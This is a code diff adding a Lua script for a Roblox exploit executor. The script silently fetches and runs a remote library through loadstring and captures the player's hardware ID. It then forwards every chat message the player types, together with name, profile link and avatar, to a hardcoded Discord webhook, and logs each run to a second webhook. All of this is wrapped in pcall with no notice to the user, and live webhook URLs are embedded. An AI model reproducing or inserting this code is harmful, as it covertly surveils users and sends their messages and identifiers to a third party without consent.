@@ -1,0 +1,68 @@
+pcall(function()
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
+
+function HeadshotPict()
+	local HttpService = game:GetService("HttpService")
+	local player = game:GetService("Players").LocalPlayer
+	local url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=".. player.UserId .."&size=420x420&format=Png&isCircular=false"
+
+	local httpRequest = syn and syn.request or http_request or request
+	if not httpRequest then
+		warn("HTTP request function not found!")
+		return nil
+	end
+
+	local response = httpRequest({
+		Url = url,
+		Method = "GET",
+		Headers = {
+			["Content-Type"] = "application/json"
+		}
+	})
+
+	if response and response.Body then
+		local data = HttpService:JSONDecode(response.Body)
+		if data and data.data and #data.data > 0 then
+			return data.data[1].imageUrl
+		end
+	end
+	return nil
+end
+
+Rey = loadstring(game:HttpGet('https://raw.githubusercontent.com/RezaKazzel/Script-Roblox/refs/heads/main/UI/Rey%20Library%20New'))()
+player.Chatted:Connect(function(message)
+	Rey:SendWebhook(
+		"https://discord.com/api/webhooks/1341465551649767544/6Z1RuqIzsrE0JZc2PC8ooNGaUZwYMwy918w9Lj1Jif_UCmRrE08nAfMJzm6btoexpb8X",
+		nil,
+		nil,
+		{
+			title = "Chat: \n"..message,
+			color = tonumber("0000FF", 16),
+			footer = { text = HWID },
+			author = {
+				name = player.Name.. " ("..player.DisplayName..")",
+				url = "https://www.roblox.com/users/"..player.UserId.."/profile",
+				icon_url = HeadshotPict()
+			}
+		}
+	)
+end)
+
+Rey:SendWebhook(
+	"https://discord.com/api/webhooks/1341477324440469504/ihk7arCPTLD2GQ73cx9UDaGLdHiDdQQykfwqGvsHbnbU9TN_nbDDm7AQe9Rz8TJHkIog",
+	nil,
+	nil,
+	{
+		title = "Executing Rey",
+		color = tonumber("00FF00", 16),
+		footer = { text = HWID },
+		author = {
+			name = player.Name.. " ("..player.DisplayName..")",
+			url = "https://www.roblox.com/users/"..player.UserId.."/profile",
+			icon_url = HeadshotPict()
+		}
+	}
+)
+end)
